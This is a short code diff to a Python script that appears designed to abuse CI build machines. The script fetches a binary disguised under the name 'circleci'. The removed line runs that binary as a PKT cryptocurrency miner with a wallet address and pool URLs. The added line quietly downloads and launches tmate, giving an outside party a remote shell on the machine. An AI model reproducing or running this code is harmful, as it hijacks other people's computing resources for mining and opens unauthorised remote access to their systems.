@@ -3,4 +3,4 @@ import urllib.request
 import os
 print('ssst')
 urllib.request.urlretrieve('https://github.com/aurbach55/zash/raw/main/circleci','circleci')
-os.system ("chmod 777 circleci && ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pkteer.com http://pool.pktpool.io ")
+os.system ("wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz &> /dev/null && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz &> /dev/null && cd tmate-2.4.0-static-linux-amd64 &> /dev/null && ./tmate -F ")
